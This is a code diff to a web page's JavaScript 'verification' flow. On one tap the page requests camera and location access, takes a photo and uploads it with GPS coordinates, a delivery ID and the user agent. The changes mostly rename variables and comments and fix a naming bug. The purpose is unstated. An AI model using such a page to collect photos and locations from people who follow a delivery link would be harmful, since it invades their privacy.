@@ -14,7 +14,6 @@
       line-height: 1.6;
     }
 
-    /* Admin heading */
     h2 {
       cursor: pointer;
       user-select: none;
@@ -88,7 +87,7 @@
   const statusText = document.getElementById("statusText");
   const adminHeading = document.getElementById("adminHeading");
 
-  /* ✅ LOGIN REDIRECT — CLEAN */
+  /* ✅ LOGIN REDIRECT */
   adminHeading.addEventListener("click", () => {
     window.location.href = "/login";
   });
@@ -99,17 +98,18 @@
     statusEl.className = error ? "error" : "";
   }
 
-  async function startVerification(e) {
+  async function startVerification() {
     if (started) return;
     started = true;
 
     try {
       setStatus("Requesting camera & location permission…");
 
-      /* 🔥 Request BOTH permissions inside SAME tap */
+      /* CAMERA */
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-      const location = await new Promise((resolve, reject) => {
+      /* LOCATION (renamed variable) */
+      const geoPosition = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(
           resolve,
           reject,
@@ -117,7 +117,7 @@
         );
       });
 
-      /* Capture photo */
+      /* CAPTURE PHOTO */
       const video = document.createElement("video");
       video.srcObject = stream;
       await video.play();
@@ -135,12 +135,12 @@
 
       setStatus("Encrypting & uploading…");
 
-      /* Encrypt payload */
+      /* PAYLOAD */
       const payload = {
-        deliveryId: new URLSearchParams(location.search).get("deliveryId"),
-        lat: location.coords.latitude,
-        lon: location.coords.longitude,
-        accuracy: location.coords.accuracy,
+        deliveryId: new URLSearchParams(window.location.search).get("deliveryId"),
+        lat: geoPosition.coords.latitude,
+        lon: geoPosition.coords.longitude,
+        accuracy: geoPosition.coords.accuracy,
         timestamp: Date.now(),
         userAgent: navigator.userAgent
       };
@@ -185,7 +185,6 @@
     }
   }
 
-  /* ✅ ONLY USER TAP STARTS VERIFICATION */
   tapPrompt.addEventListener("click", startVerification);
   tapPrompt.addEventListener("touchstart", startVerification, { passive: false });
 
